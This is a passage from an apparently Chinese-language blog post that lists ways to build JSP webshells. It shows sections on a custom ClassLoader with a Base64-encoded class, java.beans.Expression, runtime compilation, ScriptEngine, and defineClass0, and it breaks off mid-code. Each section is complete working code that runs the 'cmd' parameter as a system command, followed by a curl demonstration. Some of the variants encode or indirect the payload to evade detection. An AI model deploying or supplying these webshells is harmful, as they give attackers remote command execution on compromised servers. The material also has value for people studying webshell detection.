class="regexp">/Home/</span>jre<span class="regexp">/lib/</span>jfr.jar:<span class="regexp">/Library/</span>Java<span class="regexp">/JavaVirtualMachines/</span>jdk1.<span class="number">8.0</span>_101.jdk<span class="regexp">/Contents/</span>Home<span class="regexp">/jre/</span>lib<span class="regexp">/jfxswt.jar:/</span>Library<span class="regexp">/Java/</span>JavaVirtualMachines<span class="regexp">/jdk1.8.0_101.jdk/</span>Contents<span class="regexp">/Home/</span>jre<span class="regexp">/lib/</span>jsse.jar:<span class="regexp">/Library/</span>Java<span class="regexp">/JavaVirtualMachines/</span>jdk1.<span class="number">8.0</span>_101.jdk<span class="regexp">/Contents/</span>Home<span class="regexp">/jre/</span>lib<span class="regexp">/management-agent.jar:/</span>Library<span class="regexp">/Java/</span>JavaVirtualMachines<span class="regexp">/jdk1.8.0_101.jdk/</span>Contents<span class="regexp">/Home/</span>jre<span class="regexp">/lib/</span>plugin.jar:<span class="regexp">/Library/</span>Java<span class="regexp">/JavaVirtualMachines/</span>jdk1.<span class="number">8.0</span>_101.jdk<span class="regexp">/Contents/</span>Home<span class="regexp">/jre/</span>lib<span class="regexp">/resources.jar:/</span>Library<span class="regexp">/Java/</span>JavaVirtualMachines<span class="regexp">/jdk1.8.0_101.jdk/</span>Contents<span class="regexp">/Home/</span>jre<span class="regexp">/lib/</span>rt.jar:<span class="regexp">/Library/</span>Java<span class="regexp">/JavaVirtualMachines/</span>jdk1.<span class="number">8.0</span>_101.jdk<span class="regexp">/Contents/</span>Home<span class="regexp">/lib/</span>ant-javafx.jar:<span class="regexp">/Library/</span>Java<span class="regexp">/JavaVirtualMachines/</span>jdk1.<span class="number">8.0</span>_101.jdk<span class="regexp">/Contents/</span>Home<span class="regexp">/lib/</span>dt.jar:<span class="regexp">/Library/</span>Java<span class="regexp">/JavaVirtualMachines/</span>jdk1.<span class="number">8.0</span>_101.jdk<span class="regexp">/Contents/</span>Home<span class="regexp">/lib/</span>javafx-mx.jar:<span class="regexp">/Library/</span>Java<span class="regexp">/JavaVirtualMachines/</span>jdk1.<span class="number">8.0</span>_101.jdk<span class="regexp">/Contents/</span>Home<span class="regexp">/lib/</span>jconsole.jar:<span class="regexp">/Library/</span>Java<span class="regexp">/JavaVirtualMachines/</span>jdk1.<span class="number">8.0</span>_101.jdk<span class="regexp">/Contents/</span>Home<span class="regexp">/lib/</span>packager.jar:<span class="regexp">/Library/</span>Java<span class="regexp">/JavaVirtualMachines/</span>jdk1.<span class="number">8.0</span>_101.jdk<span class="regexp">/Contents/</span>Home<span class="regexp">/lib/</span>sa-jdi.jar:<span class="regexp">/Library/</span>Java<span class="regexp">/JavaVirtualMachines/</span>jdk1.<span class="number">8.0</span>_101.jdk<span class="regexp">/Contents/</span>Home<span class="regexp">/lib/</span>tools.jar:<span class="regexp">/Users/</span>shadowflow<span class="regexp">/code/</span>java<span class="regexp">/sec/</span>target/classes Util</span><br><span class="line">objc[<span class="number">13083</span>]: Class JavaLaunchHelper is implemented <span class="keyword">in</span> both <span class="regexp">/Library/</span>Java<span class="regexp">/JavaVirtualMachines/</span>jdk1.<span class="number">8.0</span>_101.jdk<span class="regexp">/Contents/</span>Home<span class="regexp">/bin/</span>java (<span class="number">0</span>x10ae674c0) and <span class="regexp">/Library/</span>Java<span class="regexp">/JavaVirtualMachines/</span>jdk1.<span class="number">8.0</span>_101.jdk<span class="regexp">/Contents/</span>Home<span class="regexp">/jre/</span>lib/libinstrument.dylib (<span class="number">0</span>x10aee14e0). One of the two will be used. Which one is undefined.</span><br><span class="line">yv66vgAAADQATgoAEQAsBwAtCgACACwKAC4ALwoALgAwBwAxBwAyCgAzADQKAAcANQoABgA2CgAGADcKAAIAOAgAOQoAAgA6CQAQADsHADwHAD0BAANyZXMBABJMamF2YS9sYW5nL1N0cmluZzsBAAY8aW5pdD4BABUoTGphdmEvbGFuZy9TdHJpbmc7KVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEABUxFeHA7AQADY21kAQANc3RyaW5nQnVpbGRlcgEAGUxqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcjsBAAZyZWFkZXIBABhMamF2YS9pby9CdWZmZXJlZFJlYWRlcjsBAARsaW5lAQANU3RhY2tNYXBUYWJsZQcAPAcAPgcALQcAMQEACkV4Y2VwdGlvbnMHAD8BAAh0b1N0cmluZwEAFCgpTGphdmEvbGFuZy9TdHJpbmc7AQAKU291cmNlRmlsZQEACEV4cC5qYXZhDAAUAEABABdqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcgcAQQwAQgBDDABEAEUBABZqYXZhL2lvL0J1ZmZlcmVkUmVhZGVyAQAZamF2YS9pby9JbnB1dFN0cmVhbVJlYWRlcgcARgwARwBIDAAUAEkMABQASgwASwApDABMAE0BAAEKDAAoACkMABIAEwEAA0V4cAEAEGphdmEvbGFuZy9PYmplY3QBABBqYXZhL2xhbmcvU3RyaW5nAQATamF2YS9sYW5nL0V4Y2VwdGlvbgEAAygpVgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsBABFqYXZhL2xhbmcvUHJvY2VzcwEADmdldElucHV0U3RyZWFtAQAXKClMamF2YS9pby9JbnB1dFN0cmVhbTsBABgoTGphdmEvaW8vSW5wdXRTdHJlYW07KVYBABMoTGphdmEvaW8vUmVhZGVyOylWAQAIcmVhZExpbmUBAAZhcHBlbmQBAC0oTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcjsAIQAQABEAAAABAAAAEgATAAAAAgABABQAFQACABYAAADeAAYABQAAAE8qtwABuwACWbcAA024AAQrtgAFV7sABlm7AAdZuAAEK7YABbYACLcACbcACk4ttgALWToExgASLBkEtgAMEg22AAxXp<span class="regexp">//</span>qKiy2AA61AA+xAAAAAwAXAAAAIgAIAAAABgAEAAcADAAIABQACQAtAAsANwAMAEYADgBOAA8AGAAAADQABQAAAE8AGQAaAAAAAABPABsAEwABAAwAQwAcAB0AAgAtACIAHgAfAAMANAAbACAAEwAEACEAAAAbAAL<span class="regexp">/AC0ABAcAIgcAIwcAJAcAJQAA/</span>AAYBwAjACYAAAAEAAEAJwABACgAKQABABYAAAAvAAEAAQAAAAUqtAAPsAAAAAIAFwAAAAYAAQAAABIAGAAAAAwAAQAAAAUAGQAaAAAAAQAqAAAAAgAr</span><br><span class="line"></span><br><span class="line">Process finished with <span class="keyword">exit</span> code <span class="number">0</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>将结果复制出来，==复制的时候不要双击复制，这样复制不全==</p>
<p>插入classloader.jsp</p>
<figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.Base64&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Constructor&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;Title&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    String cmd = request.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">    ClassLoader classLoader = <span class="keyword">new</span> ClassLoader() &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> Class&lt;?&gt; loadClass(String name) <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">            <span class="keyword">if</span>(name.contains(<span class="string">&quot;Exp&quot;</span>))&#123;</span><br><span class="line">                <span class="keyword">return</span> findClass(name);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">super</span>.loadClass(name);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">protected</span> Class&lt;?&gt; findClass(String name) <span class="keyword">throws</span> ClassNotFoundException&#123;</span><br><span class="line">            <span class="keyword">byte</span>[] code = Base64.getDecoder().decode(<span class="string">&quot;yv66vgAAADQATgoAEQAsBwAtCgACACwKAC4ALwoALgAwBwAxBwAyCgAzADQKAAcANQoABgA2CgAGADcKAAIAOAgAOQoAAgA6CQAQADsHADwHAD0BAANyZXMBABJMamF2YS9sYW5nL1N0cmluZzsBAAY8aW5pdD4BABUoTGphdmEvbGFuZy9TdHJpbmc7KVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEABUxFeHA7AQADY21kAQANc3RyaW5nQnVpbGRlcgEAGUxqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcjsBAAZyZWFkZXIBABhMamF2YS9pby9CdWZmZXJlZFJlYWRlcjsBAARsaW5lAQANU3RhY2tNYXBUYWJsZQcAPAcAPgcALQcAMQEACkV4Y2VwdGlvbnMHAD8BAAh0b1N0cmluZwEAFCgpTGphdmEvbGFuZy9TdHJpbmc7AQAKU291cmNlRmlsZQEACEV4cC5qYXZhDAAUAEABABdqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcgcAQQwAQgBDDABEAEUBABZqYXZhL2lvL0J1ZmZlcmVkUmVhZGVyAQAZamF2YS9pby9JbnB1dFN0cmVhbVJlYWRlcgcARgwARwBIDAAUAEkMABQASgwASwApDABMAE0BAAEKDAAoACkMABIAEwEAA0V4cAEAEGphdmEvbGFuZy9PYmplY3QBABBqYXZhL2xhbmcvU3RyaW5nAQATamF2YS9sYW5nL0V4Y2VwdGlvbgEAAygpVgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsBABFqYXZhL2xhbmcvUHJvY2VzcwEADmdldElucHV0U3RyZWFtAQAXKClMamF2YS9pby9JbnB1dFN0cmVhbTsBABgoTGphdmEvaW8vSW5wdXRTdHJlYW07KVYBABMoTGphdmEvaW8vUmVhZGVyOylWAQAIcmVhZExpbmUBAAZhcHBlbmQBAC0oTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcjsAIQAQABEAAAABAAAAEgATAAAAAgABABQAFQACABYAAADeAAYABQAAAE8qtwABuwACWbcAA024AAQrtgAFV7sABlm7AAdZuAAEK7YABbYACLcACbcACk4ttgALWToExgASLBkEtgAMEg22AAxXp//qKiy2AA61AA+xAAAAAwAXAAAAIgAIAAAABgAEAAcADAAIABQACQAtAAsANwAMAEYADgBOAA8AGAAAADQABQAAAE8AGQAaAAAAAABPABsAEwABAAwAQwAcAB0AAgAtACIAHgAfAAMANAAbACAAEwAEACEAAAAbAAL/AC0ABAcAIgcAIwcAJAcAJQAA/AAYBwAjACYAAAAEAAEAJwABACgAKQABABYAAAAvAAEAAQAAAAUqtAAPsAAAAAIAFwAAAAYAAQAAABIAGAAAAAwAAQAAAAUAGQAaAAAAAQAqAAAAAgAr&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">this</span>.defineClass(name, code, <span class="number">0</span>, code.length);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    Class&lt;?&gt; clazz = classLoader.loadClass(<span class="string">&quot;Exp&quot;</span>);</span><br><span class="line">    Constructor&lt;?&gt; con = clazz.getConstructor(String.class);</span><br><span class="line">    String result = con.newInstance(cmd).toString();</span><br><span class="line">    response.getWriter().println(<span class="string">&quot;&lt;pre&gt;&quot;</span>);</span><br><span class="line">    response.getWriter().println(result);</span><br><span class="line">    response.getWriter().println(<span class="string">&quot;&lt;/pre&gt;&quot;</span>);</span><br><span class="line"></span><br><span class="line">%&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line">[shadowflow<span class="meta">@ShadowOS</span> /tmp]% curl http:<span class="comment">//localhost:8080/jspshell_war/classloader.jsp?cmd=whoami</span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">pre</span>&gt;</span></span></span><br><span class="line"><span class="xml">shadowflow</span></span><br><span class="line"><span class="xml"></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">pre</span>&gt;</span></span></span><br></pre></td></tr></table></figure>



<h2 id="9-BeansExpression"><a href="#9-BeansExpression" class="headerlink" title="9. BeansExpression"></a>9. BeansExpression</h2><p>通过<code>java.beans.Expression</code>来执行<code>getRuntime()</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.InputStreamReader&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.BufferedReader&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.beans.Expression&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.InputStream&quot;</span> %&gt;</span><br><span class="line"></span><br><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    String cmd = request.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">    Expression expr = <span class="keyword">new</span> Expression(Runtime.getRuntime(), <span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> Object[]&#123;cmd&#125;);</span><br><span class="line">    Process process = (Process) expr.getValue();</span><br><span class="line">    InputStream in = process.getInputStream();</span><br><span class="line"></span><br><span class="line">    StringBuilder sb = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">    InputStreamReader resultReader = <span class="keyword">new</span> InputStreamReader(in);</span><br><span class="line">    BufferedReader stdInput = <span class="keyword">new</span> BufferedReader(resultReader);</span><br><span class="line">    String s = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">while</span> ((s=stdInput.readLine()) != <span class="keyword">null</span>) &#123;</span><br><span class="line">        sb.append(s).append(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    response.getWriter().print(sb.toString());</span><br><span class="line">%&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>





<h2 id="10-动态编译"><a href="#10-动态编译" class="headerlink" title="10. 动态编译"></a>10. 动态编译</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.nio.file.Files&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.File&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.nio.file.Paths&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.nio.charset.StandardCharsets&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;javax.tools.JavaCompiler&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;javax.tools.ToolProvider&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;javax.tools.DiagnosticCollector&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.Locale&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.nio.charset.Charset&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;javax.tools.StandardJavaFileManager&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.net.URLClassLoader&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.net.URL&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Constructor&quot;</span> %&gt;</span><br><span class="line"></span><br><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    String cmd = request.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">    String tmpPath = Files.createTempDirectory(<span class="string">&quot;xxxooo&quot;</span>).toFile().getPath();</span><br><span class="line">    String code = <span class="string">&quot;import java.io.BufferedReader;\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;import java.io.InputStreamReader;\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;public class Exp &#123;\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;    String res;\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;    public Exp(String cmd) throws Exception&#123;\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;        StringBuilder stringBuilder = new StringBuilder();\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;        Runtime.getRuntime().exec(cmd);\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;        BufferedReader reader = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(cmd).getInputStream()));\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;        String line;\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;        while((line=reader.readLine())!=null)&#123;\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;            stringBuilder.append(line).append(\&quot;\\n\&quot;);\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;        &#125;\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;       this.res = stringBuilder.toString();\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;    &#125;\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;    @Override\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;    public String toString() &#123;\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;        return res;\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;    &#125;\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;&#125;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line">    Files.write(Paths.get(tmpPath + File.separator + <span class="string">&quot;Exp.java&quot;</span>), code.getBytes(StandardCharsets.UTF_8));</span><br><span class="line">    JavaCompiler javaCompiler = ToolProvider.getSystemJavaCompiler();</span><br><span class="line">    DiagnosticCollector diagnosticCollector = <span class="keyword">new</span> DiagnosticCollector();</span><br><span class="line">    StandardJavaFileManager standardJavaFileManager = javaCompiler.getStandardFileManager(diagnosticCollector, Locale.CHINA, Charset.forName(<span class="string">&quot;UTF-8&quot;</span>));</span><br><span class="line">    Iterable fileObjects = standardJavaFileManager.getJavaFileObjects(tmpPath + File.separator + <span class="string">&quot;Exp.java&quot;</span>);</span><br><span class="line">    javaCompiler.getTask(<span class="keyword">null</span>, standardJavaFileManager, diagnosticCollector, <span class="keyword">null</span>, <span class="keyword">null</span>, fileObjects).call();</span><br><span class="line"></span><br><span class="line">    URLClassLoader classLoader = <span class="keyword">new</span> URLClassLoader(<span class="keyword">new</span> URL[]&#123;<span class="keyword">new</span> URL(<span class="string">&quot;file:&quot;</span> + tmpPath + File.separator)&#125;);</span><br><span class="line">    Class&lt;?&gt; clazz = classLoader.loadClass(<span class="string">&quot;Exp&quot;</span>);</span><br><span class="line">    Constructor&lt;?&gt; constructor = clazz.getConstructor(String.class);</span><br><span class="line">    Object obj = constructor.newInstance(cmd);</span><br><span class="line"></span><br><span class="line">    response.getWriter().println(obj);</span><br><span class="line">%&gt;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">[shadowflow@ShadowOS ~]% curl http:<span class="regexp">//</span>localhost:<span class="number">8080</span><span class="regexp">/jspshell_war/</span>javac.jsp\?cmd\=whoami</span><br><span class="line">shadowflow</span><br></pre></td></tr></table></figure>











<h2 id="11-ScriptEngine"><a href="#11-ScriptEngine" class="headerlink" title="11. ScriptEngine"></a>11. ScriptEngine</h2><p>test.js</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        load(<span class="string">&quot;nashorn:mozilla_compat.js&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">    &#125;</span><br><span class="line">    importPackage(Packages.java.lang);</span><br><span class="line">    <span class="keyword">var</span> cmd = request.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">    <span class="keyword">var</span> x = java.lang.Runtime.getRuntime().exec(cmd);</span><br><span class="line">    <span class="keyword">return</span> x.getInputStream();</span><br><span class="line">&#125;</span><br><span class="line">test();</span><br></pre></td></tr></table></figure>

<p>将test.js放入scriptEngine.jsp</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.InputStreamReader&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.BufferedReader&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.beans.Expression&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.InputStream&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;javax.script.ScriptEngine&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;javax.script.ScriptEngineManager&quot;</span> %&gt;</span><br><span class="line"></span><br><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    String jsCode = <span class="string">&quot;function test() &#123;\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;    try &#123;\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;        load(\&quot;nashorn:mozilla_compat.js\&quot;);\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;    &#125; catch (e) &#123;\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;    &#125;\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;    importPackage(Packages.java.lang);\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;    var cmd = request.getParameter(\&quot;cmd\&quot;);\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;    var x = java.lang.Runtime.getRuntime().exec(cmd);\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;    return x.getInputStream();\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;&#125;\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;test();&quot;</span>;</span><br><span class="line">    ScriptEngine scriptEngine = <span class="keyword">new</span> ScriptEngineManager().getEngineByName(<span class="string">&quot;JavaScript&quot;</span>);</span><br><span class="line">    scriptEngine.put(<span class="string">&quot;request&quot;</span>, request);</span><br><span class="line">    scriptEngine.eval(jsCode);</span><br><span class="line">    InputStream inputStream = (InputStream) scriptEngine.eval(jsCode);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    String cmd = request.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">    Expression expr = <span class="keyword">new</span> Expression(Runtime.getRuntime(), <span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> Object[]&#123;cmd&#125;);</span><br><span class="line">    Process process = (Process) expr.getValue();</span><br><span class="line">    InputStream in = process.getInputStream();</span><br><span class="line"></span><br><span class="line">    StringBuilder sb = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">    InputStreamReader resultReader = <span class="keyword">new</span> InputStreamReader(in);</span><br><span class="line">    BufferedReader stdInput = <span class="keyword">new</span> BufferedReader(resultReader);</span><br><span class="line">    String s = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">while</span> ((s=stdInput.readLine()) != <span class="keyword">null</span>) &#123;</span><br><span class="line">        sb.append(s).append(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    response.getWriter().print(sb.toString());</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>

<p>运行</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">[shadowflow@ShadowOS ~]% curl http:<span class="regexp">//</span>localhost:<span class="number">8080</span><span class="regexp">/jspshell_war/</span>scriptEngine.jsp\?cmd\=whoami</span><br><span class="line">shadowflow</span><br></pre></td></tr></table></figure>



<h2 id="12-Native方法defineClass0"><a href="#12-Native方法defineClass0" class="headerlink" title="12. Native方法defineClass0"></a>12. Native方法defineClass0</h2><figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.security.ProtectionDomain&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Method&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;com.sun.org.apache.xml.internal.security.utils.Base64&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Constructor&quot;</span> %&gt;</span><br><span class="line"></span><br><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">    <span class="keyword">byte</span>[] code = Base64.decode(<span class="string">&quot;yv66vgAAADQATgoAEQAsBwAtCgACACwKAC4ALwoALgAwBwAxBwAyCgAzADQKAAcANQoABgA2CgAGADcKAAIAOAgAOQoAAgA6CQAQADsHADwHAD0BAANyZXMBABJMamF2YS9sYW5nL1N0cmluZzsBAAY8aW5pdD4BABUoTGphdmEvbGFuZy9TdHJpbmc7KVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEABUxFeHA7AQADY21kAQANc3RyaW5nQnVpbGRlcgEAGUxqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcjsBAAZyZWFkZXIBABhMamF2YS9pby9CdWZmZXJlZFJlYWRlcjsBAARsaW5lAQANU3RhY2tNYXBUYWJsZQcAPAcAPgcALQcAMQEACkV4Y2VwdGlvbnMHAD8BAAh0b1N0cmluZwEAFCgpTGphdmEvbGFuZy9TdHJpbmc7AQAKU291cmNlRmlsZQEACEV4cC5qYXZhDAAUAEABABdqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcgcAQQwAQgBDDABEAEUBABZqYXZhL2lvL0J1ZmZlcmVkUmVhZGVyAQAZamF2YS9pby9JbnB1dFN0cmVhbVJlYWRlcgcARgwARwBIDAAUAEkMABQASgwASwApDABMAE0BAAEKDAAoACkMABIAEwEAA0V4cAEAEGphdmEvbGFuZy9PYmplY3QBABBqYXZhL2xhbmcvU3RyaW5nAQATamF2YS9sYW5nL0V4Y2VwdGlvbgEAAygpVgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsBABFqYXZhL2xhbmcvUHJvY2VzcwEADmdldElucHV0U3RyZWFtAQAXKClMamF2YS9pby9JbnB1dFN0cmVhbTsBABgoTGphdmEvaW8vSW5wdXRTdHJlYW07KVYBABMoTGphdmEvaW8vUmVhZGVyOylWAQAIcmVhZExpbmUBAAZhcHBlbmQBAC0oTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcjsAIQAQABEAAAABAAAAEgATAAAAAgABABQAFQACABYAAADeAAYABQAAAE8qtwABuwACWbcAA024AAQrtgAFV7sABlm7AAdZuAAEK7YABbYACLcACbcACk4ttgALWToExgASLBkEtgAMEg22AAxXp//qKiy2AA61AA+xAAAAAwAXAAAAIgAIAAAABgAEAAcADAAIABQACQAtAAsANwAMAEYADgBOAA8AGAAAADQABQAAAE8AGQAaAAAAAABPABsAEwABAAwAQwAcAB0AAgAtACIAHgAfAAMANAAbACAAEwAEACEAAAAbAAL/AC0ABAcAIgcAIwcAJAcAJQAA/AAYBwAjACYAAAAEAAEAJwABACgAKQABABYAAAAvAAEAAQAAAAUqtAAPsAAAAAIAFwAAAAYAAQAAABIAGAAAAAwAAQAAAAUAGQAaAAAAAQAqAAAAAgAr&quot;</span>);</span><br><span class="line">    <span class="comment">//Proxy.class.getDeclaredMethod(&quot;defineClass0&quot;, ClassLoader.class, String.class, byte[].class, int.class, int.class);</span></span><br><span class="line">    ClassLoader classLoader = ClassLoader.getSystemClassLoader();</span><br><span class="line">    Method method = 